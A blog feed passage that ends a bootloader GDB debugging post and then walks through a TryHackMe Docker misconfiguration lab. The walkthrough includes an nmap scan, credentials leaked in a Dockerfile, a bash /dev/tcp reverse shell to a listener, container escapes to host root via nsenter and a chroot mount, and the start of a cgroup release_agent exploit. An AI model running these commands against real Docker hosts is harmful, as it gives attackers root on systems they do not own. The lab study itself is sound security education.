    -q

Remote debugging using localhost:1234
warning: No executable has been specified and target does not support
determining executable automatically.  Try using the &quot;file&quot; command.
0x0000fff0 in ?? ()
warning: A handler for the OS ABI &quot;GNU/Linux&quot; is not built into this configuration
of GDB.  Attempting to continue with the default i8086 settings.

The target architecture is assumed to be i8086
Breakpoint 1 at 0x7c00
Continuing.

Breakpoint 1, 0x00007c00 in ?? ()
=&amp;gt; 0x7c00:	jmp    0x7c02
   0x7c02:	mov    ax,cs
   0x7c04:	mov    ds,ax
   0x7c06:	mov    si,0x7c88
   0x7c09:	call   0x7c0c
   0x7c0c:	push   ax
   0x7c0d:	cld    
   0x7c0e:	mov    al,BYTE PTR [si]
   0x7c10:	cmp    al,0x0
   0x7c12:	je     0x7c1a
   0x7c14:	call   0x7c1c
   0x7c17:	inc    si
   0x7c18:	jmp    0x7c0e
   0x7c1a:	jmp    0x7c21
   0x7c1c:	mov    ah,0xe
   0x7c1e:	int    0x10
   0x7c20:	ret    
   0x7c21:	mov    ax,cs
   0x7c23:	mov    ds,ax
   0x7c25:	mov    ds:0x7c78,ax
   0x7c28:	mov    DWORD PTR ds:0x7c76,0x7c82
   0x7c31:	mov    ah,0x43
   0x7c33:	mov    al,0x0
   0x7c35:	mov    dl,BYTE PTR ds:0x7c87
   0x7c39:	add    dl,0x80
   0x7c3c:	mov    si,0x7c72
   0x7c3f:	int    0x13
   0x7c41:	jb     0x7c45
   0x7c43:	jae    0x7c5d
   0x7c45:	inc    BYTE PTR ds:0x7c87
   0x7c49:	mov    DWORD PTR ds:0x7c7a,0x1
   0x7c52:	mov    DWORD PTR ds:0x7c7e,0x0
   0x7c5b:	jmp    0x7c21
   0x7c5d:	add    DWORD PTR ds:0x7c7a,0xc7
   0x7c66:	adc    DWORD PTR ds:0x7c7e,0x0
   0x7c6f:	clc    
   0x7c70:	jmp    0x7c21
(gdb)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The disassembly matches the output from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objdump&lt;/code&gt;, so the configuration works. The GDB command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x/36i $pc&lt;/code&gt;, used as a command-line argument, dumps everything up to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x70&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7c70&lt;/code&gt; given the virtual offset). We can now run dynamic tests as needed.&lt;/p&gt;

&lt;p&gt;There are a couple of things I want to test.&lt;/p&gt;

&lt;p&gt;First, I want to prove that the carry flag CF is always set to zero, thereby confirming my suspicion that the instructions on lines 0x66 and 0x67 are redundant. We can prove this with a conditional breakpoint:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;break *0x7c66 if $eflags 1
continue
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This will break at line 0x66 only if CF == 1. You can continue execution. This condition is never triggered, and the process will continue indefinitely. We can conclude that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MOV&lt;/code&gt; statement is indeed useless.&lt;/p&gt;

&lt;p&gt;Next, I want to see what value is actually set at 0x7c76, which falls in the range of the transfer buffer address. Restart the debugger and QEMU. Place a breakpoint at that instruction, continue execution, and inspect the values:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;break *0x7c25
continue
...
info reg cs eax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Both AX and CS are set to 0x0. No change is made to the transfer buffer address. The purpose of this instruction is still not clear, but at least we know it’s not altering the code in any meaningful way.&lt;/p&gt;</content><author><name></name></author><summary type="html">Many years ago, I read through a catalog of master’s courses. One of the first courses in the program is about operating systems. The very first topic they explore is how to create a custom, operating-system-agnostic bootloader from scratch.</summary></entry><entry><title type="html">Exploring Docker Misconfigurations</title><link href="http://localhost:4000/2024/09/03/Exploring-Docker-Misconfigurations.html" rel="alternate" type="text/html" title="Exploring Docker Misconfigurations" /><published>2024-09-03T00:00:00-04:00</published><updated>2024-09-03T00:00:00-04:00</updated><id>http://localhost:4000/2024/09/03/Exploring-Docker-Misconfigurations</id><content type="html" xml:base="http://localhost:4000/2024/09/03/Exploring-Docker-Misconfigurations.html">&lt;p&gt;This walkthrough will cover the “Docker Practical” from TryHackMe’s Container Security path. The environment is an insecure, goat-like deployment, meant for excessive hacking. You are unlikely to find something like this in the wild; but, in the rare case that you do, be aware of the attack vectors laid out here.&lt;/p&gt;

&lt;p&gt;In the real world, you might see these vulnerabilities in piecemeal, but likely not all together at once. The root causes lay in the configuration: weak or nonexistent permissions; insecure exposure of the docker API; and an underlying system that still supports Cgroup v1. Taken together, you can start to appreciate how you might approach an environment that uses any (hopefully not &lt;em&gt;all&lt;/em&gt;) of these insecure configurations.&lt;/p&gt;

&lt;p&gt;One way we can appreciate such a box is by remembering that Kubernetes has been around only for about a decade. Prior to its wide adoption, infrastructure engineers and software developers needed solutions that “worked” in lieu of a formal orchestration software and API. Let’s imagine that an organization is still using their own solution, which was stood up long ago, and is off limits for upgrades because “it just works.”&lt;/p&gt;

&lt;h1 id=&quot;building-the-lab-yourself&quot;&gt;Building the lab yourself&lt;/h1&gt;

&lt;p&gt;In exploring security misconfigurations, you naturally need to understand where such configuration definitions live, and how to set them up, before you can effectively abuse them. This walkthrough will explore the configs and their locations.&lt;/p&gt;

&lt;p&gt;You can find a &lt;a href=&quot;https://github.com/halcyondream/exploring-docker-security&quot;&gt;near-identical build spec of this underlying system here&lt;/a&gt;. This includes the necessary configurations, along with a Vagrantfile that you can use to spin up the environment on your local system. Some tweaks were made, and were very deliberate; but, since both systems share the same underlying root causes, it is not difficult to exploit.&lt;/p&gt;

&lt;p&gt;Either way, try to approach the environment as a “black box,” performing the typical stages of discovery, reconnaissance, etc. before reviewing the source code. Afterwards, try to figure out what else the environment is doing; these additional findings may prove invaluable in a real-world assessment. Finally, use this to make specific recommendations for the entire SDLC, and try to redeploy a “safe” version of this infrastructure.&lt;/p&gt;

&lt;h1 id=&quot;exploring-the-environment&quot;&gt;Exploring the environment&lt;/h1&gt;

&lt;p&gt;In this engagement, we want to try to find a methodology for testing container or Docker vulnerabilities. We also want to explore the assumptions made in the THM guide. Although the lab provides a set of SSH credentials, let’s ignore them for now. Instead, imagine that you’re performing a black-box test of this system.&lt;/p&gt;

&lt;p&gt;First, check for any open ports:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~# nmap --open -p- -sV 10.10.20.228

Starting Nmap 7.60 ( https://nmap.org ) at 2024-07-11 20:07 BST

Nmap scan report for ip-10-10-20-228.eu-west-1.compute.internal (10.10.20.228)
Host is up (0.00044s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
2375/tcp open  docker  Docker 20.10.20
MAC Address: 02:B8:7C:7F:90:CD (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.54 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note the following observations:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Two open SSH ports: 22 and 2222&lt;/li&gt;
  &lt;li&gt;Both SSH services are of different versions&lt;/li&gt;
  &lt;li&gt;Docker is opened on its default port of 2375&lt;/li&gt;
  &lt;li&gt;OS scan returns nothing of value&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;At this point, you should stop and ask yourself: &lt;em&gt;what is this host supposed to do&lt;/em&gt;? We will build on this question throughout the guide. However, given the exposed Docker daemon, we can start to infer that this host is responsible for some degree of container orchestration tasks.&lt;/p&gt;

&lt;p&gt;What is a container orchestrator? &lt;a href=&quot;https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-190.pdf&quot;&gt;NIST SP 800-190&lt;/a&gt; provides a succinct, platform-agnostic definition:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Tools known as orchestrators enable DevOps personas or automation working on their behalf to pull images from registries, deploy those images into containers, and manage the running containers.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The orchestrator’s role is shown in the following workflow provided by the publication:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://www.researchgate.net/profile/Karen-Scarfone/publication/329973333/figure/fig2/AS:708952811642880@1546038930270/Container-Technology-Architecture-Tiers-Components-and-Lifecycle-Phases.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The relationship between “Orchestrator” and “Admin” illustrates a heavy degree of trust. Excessive privileges &lt;em&gt;and&lt;/em&gt; unauthorized access are both covered in section 3.1, which covers the risks of “unbounded administrative access:”&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Historically, many orchestrators were designed with the assumption that all users interacting with them would be administrators and those administrators should have environment-wide control. However, in many cases, a single orchestrator may run many different apps, each managed by different teams, and with different sensitivity levels. If the access provided to users and groups is not scoped to their specific needs, a malicious or careless user could affect or subvert the operation of other containers managed by the orchestrator.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Indeed, &lt;em&gt;unbounded administrative access&lt;/em&gt; is &lt;a href=&quot;https://docs.docker.com/config/daemon/remote-access/&quot;&gt;one such consequence of exposing Docker’s daemon via a TCP port&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Configuring Docker to accept connections from remote clients can leave you vulnerable to unauthorized access to the host and other attacks.&lt;/p&gt;

  &lt;p&gt;It’s critically important that you understand the security implications of opening Docker to the network. If steps aren’t taken to secure the connection, it’s possible for remote non-root users to gain root access on the host.&lt;/p&gt;

  &lt;p&gt;Remote access without TLS is &lt;strong&gt;not recommended&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The bit about “gaining root access to the host” is a consequence of abundant privileges given to the Docker daemon. For example, one could mount the host’s root filesystem to a container and &lt;em&gt;chroot&lt;/em&gt; into it; or, for a privileged container, could use &lt;em&gt;nsenter&lt;/em&gt; to enter the init Namespace, which effectively gives the user root access. Both exploits are provided later, but you should consider that a setup like this may be plagued with privilege escalation vectors.&lt;/p&gt;

&lt;p&gt;For now, let’s roll with the speculation that this host is part of a container orchestration process. Perhaps its configuration predates a more robust solution, like Kubernetes.&lt;/p&gt;

&lt;p&gt;Let’s try to understand what else this system is doing. Try some Docker recon with &lt;em&gt;ps&lt;/em&gt;, which returns a list of running containers:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~# docker -H 10.10.20.228 ps
CONTAINER ID        IMAGE               COMMAND               CREATED             STATUS              PORTS                               NAMES
7b7461f9882e        dockertest          &quot;/usr/sbin/sshd -D&quot;   6 months ago        Up 8 minutes        0.0.0.0:22-&amp;gt;22/tcp, :::22-&amp;gt;22/tcp   beautiful_pasteur
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The fact that port 22 is exposed to the host is interesting. Based on the Nmap results earlier, we can infer that the Port 22 SSH server on the host is, in fact, this container. The irony is that, with the Docker daemon exposed over TCP, an attacker does not need to SSH into this box at all in order to compromise it.&lt;/p&gt;

&lt;p&gt;Next, let’s inspect the runtime parameters for this container:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~# docker -H 10.10.20.228 inspect 7b7461f9882e
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Observe the following:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;There is a bind mount for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/run/docker.sock&lt;/code&gt; in the container&lt;/li&gt;
  &lt;li&gt;AppArmor is set to “unconfined,” which effectively disables AppArmor&lt;/li&gt;
  &lt;li&gt;The container is running in Privileged mode&lt;/li&gt;
  &lt;li&gt;Port 22 is exposed and bound to all interfaces on the host (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0.0.0.0&lt;/code&gt;), confirming the suspicion that this is the open port 22 from the Nmap scan
    &lt;ul&gt;
      &lt;li&gt;Likewise, we can speculate that port 2222 is coming from the host&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Labels suggest that the base image is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ubuntu:18.04&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The first three points are concerning, as each of them represents a security issue:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Binding &lt;em&gt;docker.sock&lt;/em&gt; exposes the host’s daemon to the container. This allows the container access the host’s Docker directly: listing images, launching containers, executing commands, and so forth.&lt;/li&gt;
  &lt;li&gt;AppArmor handles the container’s security profile. Setting it to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; effectively disables any protections in the container.&lt;/li&gt;
  &lt;li&gt;Privileged mode effectively gives container full control over the host system. If a privileged container were compromised, an attacker could leverage it to perform arbitrary damage against the host.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;It’s worth stopping here and noting that these are &lt;em&gt;not&lt;/em&gt; default settings for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker run&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;With that in mind, why would someone want to relax these settings? In the context of DevSecOps, this setup could facilitate CI/CD goals. A lesser-known, perhaps antiquated example of this is Jenkins:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The &lt;a href=&quot;https://www.jenkins.io/doc/book/installing/docker/#on-macos-and-linux&quot;&gt;official Jenkins Docker install guide&lt;/a&gt; explicitly says to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--privileged&lt;/code&gt; mode, although it “may be relaxed with newer Linux versions.” Note that they provide no recommendation here about a more secure specification.&lt;/li&gt;
  &lt;li&gt;The &lt;a href=&quot;https://www.jenkins.io/doc/book/pipeline/docker/#using-a-remote-docker-server&quot;&gt;Docker Pipeline plugin&lt;/a&gt; will communicate with the local daemon via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/run/docker.sock&lt;/code&gt;. Likewise, the &lt;a href=&quot;https://plugins.jenkins.io/docker-slaves/&quot;&gt;Docker slaves plugin&lt;/a&gt; has notes about bind mounting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker.sock&lt;/code&gt; in a build container.&lt;/li&gt;
  &lt;li&gt;Although Jenkins takes no official stance on AppArmor, a developer or maintainer may choose to disable it in the event that AppArmor is conflicting with the container’s needs.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If this highly-privileged container has jurisdiction over the CI/CD process, then controlling it would give you a foothold to manipulate the build and deployment processes of applications or services. This is hugely problematic and a big find, if applicable.&lt;/p&gt;

&lt;p&gt;For now, though, we lack a perfect understanding of that container’s purpose. Let’s keep inspecting it.&lt;/p&gt;

&lt;p&gt;Use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker history&lt;/code&gt; to view information about each layer:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker -H 10.10.20.228 history --no-trunc dockertest
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The output will show each layer, starting with the last layer first. For clarity, let’s remove the column headers, SHA256 hash, and uptime:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;... /bin/sh -c #(nop)  CMD [&quot;/usr/sbin/sshd&quot; &quot;-D&quot;]                               
... /bin/sh -c #(nop)  EXPOSE 22                                                 
... /bin/sh -c #(nop)  USER root        
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can start to see the original Dockerfile from this output:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Notice that each line after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh -c #(nop)&lt;/code&gt; represents a Dockerfile directive.&lt;/li&gt;
  &lt;li&gt;Any shell command (without an explicit directive) preceded by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh -c&lt;/code&gt; represents a RUN directive.&lt;/li&gt;
  &lt;li&gt;Finally, the last few lines match with the official Ubuntu 18.04 image on the Docker registry, so we can infer that it represents &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FROM ubuntu:18.04&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Using all of this output, we can reconstruct the image:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:18.04

RUN apt-get -qq update &amp;amp;&amp;amp; \
	DEBIAN_FRONTEND=noninteractive \
		apt-get -y --no-install-recommends -qq install \
			openssh-server \
			apt-utils \
			libcap2-bin \
			curl \
			ca-certificates \
			sudo &amp;amp;&amp;amp; \
	mkdir -p /var/run/sshd &amp;amp;&amp;amp; \
	mkdir -p /root/.ssh &amp;amp;&amp;amp; \
	mkdir -p /etc/pki/tls/certs &amp;amp;&amp;amp; \
	echo &quot;Packages installed&quot;

RUN curl -sSL https://get.docker.com/ | sh

RUN useradd -m tryhackme -s /bin/bash &amp;amp;&amp;amp; \
	mkdir -p /home/tryhackme/.ssh &amp;amp;&amp;amp; \
	echo &quot;tryhackme:tryhackme!&quot; | chpasswd &amp;amp;&amp;amp; \
	echo &quot;tryhackme user successfully added&quot;

RUN echo &quot;tryhackme ALL=(ALL,!root) NOPASSWD: /bin/bash&quot; &amp;gt;&amp;gt; /etc/sudoers &amp;amp;&amp;amp; \
	echo &quot;tryhackme user added to sudoers&quot;

WORKDIR /etc/ssh

RUN echo &quot;root:tryhackme123!&quot; | chpasswd &amp;amp;&amp;amp; \
	echo &quot;Successfully changed root password&quot; &amp;amp;&amp;amp; \
	sed --in-place &apos;s/^\(UsePAM\|PermitRootLogin\)/#\1/&apos; sshd_config &amp;amp;&amp;amp; \
	echo &quot;&quot; &amp;gt;&amp;gt; sshd_config &amp;amp;&amp;amp; \
	echo &quot;UsePAM no&quot; &amp;gt;&amp;gt; sshd_config &amp;amp;&amp;amp; \
	echo &quot;PermitRootLogin yes&quot; &amp;gt;&amp;gt; sshd_config &amp;amp;&amp;amp; \
	echo &quot;SSHD updated&quot; 

USER root

EXPOSE 22

CMD [&quot;/usr/sbin/sshd&quot;, &quot;-D&quot;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hardcoded secrets are revealed. These match the credentials given by the TryHackMe lab. However, let’s pretend we didn’t see those (i.e., that the developer had chosen to manage secrets securely), and continue investigating.&lt;/p&gt;

&lt;p&gt;Even without the root user’s credentials, we could still enter the container. The first way, as noted earlier, is by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker exec&lt;/code&gt; to launch a shell or shell commands directly.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker -H 10.10.20.228 exec -it 7b7461f9882e bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For this system, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-it&lt;/code&gt; switch is probably easier to get the shell than a reverse shell would be. However, a reverse shell is still possible from a container, and may be necessary in some cases (for example, from a web application). In those cases, the system shells may be removed when the image is built, so the shell command will need to fit the use case and vulnerability.&lt;/p&gt;

&lt;p&gt;Still, we can try it here as a simple proof. To connect via a reverse shell, start a listener on the host:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -lvnp 4242
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, leverage the exposed container. Since the image is Ubuntu, we can use a raw Bash TCP connection.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker -H 10.10.20.228 exec 7b7461f9882e \
	bash -c &apos;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.12/4242 0&amp;gt;&amp;amp;1&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Either way, you get an interactive terminal, just like with SSH. You can effectively walk through the lab vulnerabilities from this point, without any knowledge of the SSH credentials that were given. A deeper dive into the vulnerabilities is given in a later section.&lt;/p&gt;

&lt;p&gt;Now, let’s explore the host system’s configuration. As with the privileged container, we want to explore it with the intention of providing more valuable feedback about the system, as well as to prove some assumptions made during reconnaissance.&lt;/p&gt;

&lt;p&gt;At this stage, we do need to escape. From the privileged container, we could use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsenter&lt;/code&gt; to enter the init namespace, thereby giving us a root shell.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nsenter --target 1 --mount --uts --ipc --net /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We could also break out by launching a container, which targets host’s root filesystem, in order to gain a root shell. The benefit of this approach is that we could do so without needing to enter the privileged container at all: that is, by solely exploiting the exposed Docker TCP port.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker -H 10.10.20.228:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The exposed TCP port also allows us to spawn a temporary container that immediately enters the namespace of PID 1. Note that, in this approach, we also have to&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker -H 10.10.20.228:2375 run --rm -it --pid=host --privileged alpine \
  nsenter --target 1 --mount --uts --ipc --net /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Regardless of the method, we have access to the host as the root user.&lt;/p&gt;

&lt;p&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt;, we can prove that the host admin has configured the Docker daemon to listen over the network.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~# cat /etc/docker/daemon.json
{
  &quot;hosts&quot;: [&quot;tcp://0.0.0.0:2375&quot;, &quot;unix:///var/run/docker.sock&quot;]
}

~# cat /etc/systemd/system/docker.service.d/override.conf
[Service]
 ExecStart=
 ExecStart=/usr/bin/dockerd --config-file /etc/docker/daemon.json
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As noted earlier, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;daemon.json&lt;/code&gt; and systemd &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker.service&lt;/code&gt; configuration are not set to this by default.&lt;/p&gt;

&lt;p&gt;Informationally, we should also explore the system and find the OS version:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# uname -a
Linux 00379fa24a9d 5.15.0-1022-aws #26~20.04.1-Ubuntu SMP Sat Oct 15 03:22:07 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
# cat /etc/os-release
NAME=&quot;Ubuntu&quot;
VERSION=&quot;20.04.5 LTS (Focal Fossa)&quot;
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME=&quot;Ubuntu 20.04.5 LTS&quot;
VERSION_ID=&quot;20.04&quot;
HOME_URL=&quot;https://www.ubuntu.com/&quot;
SUPPORT_URL=&quot;https://help.ubuntu.com/&quot;
BUG_REPORT_URL=&quot;https://bugs.launchpad.net/ubuntu/&quot;
PRIVACY_POLICY_URL=&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Indeed, this is an instance of Ubuntu 20.04. Why is this important to know?&lt;/p&gt;

&lt;p&gt;One big reason is because Ubuntu 20.04 uses the “hybrid” implementation of cgroups v1 and v2. Cgroups v1 introduces the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;release_agent&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;notify_on_release&lt;/code&gt; behaviors (defined in &lt;a href=&quot;https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt&quot;&gt;Section 1.4 of the official cgroups v1 documentation&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;Although this was intended to allow custom “cleanup” behaviors for cgroups, an attacker could leverage a custom release agent to achieve persistent remote-code execution. Understandably, modern Linux distributions have moved entirely to &lt;a href=&quot;https://man7.org/conf/lca2019/cgroups_v2-LCA2019-Kerrisk.pdf&quot;&gt;cgroups v2, which retired the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;release_agent&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;notify_on_release&lt;/code&gt; behaviors&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Docker uses control groups as one of its main “Linux primitives,” so a host running cgroups v1 will enable containers to use release agents. If the container is unprivileged, it can use release agents within the container’s namespace only. However, if the container is privileged, an attacker can achieve &lt;a href=&quot;https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes&quot;&gt;remote code execution on the host itself&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Since this OS uses cgroups v1 in its hybrid model, it will enable these custom release agent behaviors. We can successfully run the cgroups exploit via the privileged container:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/cgrp &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; cgroup &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; rdma cgroup /tmp/cgrp &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/cgrp/x
&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;1 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/cgrp/x/notify_on_release
&lt;span class=&quot;nv&quot;&gt;host_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;s/.*\perdir=\([^,]*\).*/\1/p&apos;&lt;/span&gt; /etc/mtab&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$host_path&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/exploit&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/cgrp/release_agent
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;#!/bin/sh&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /exploit
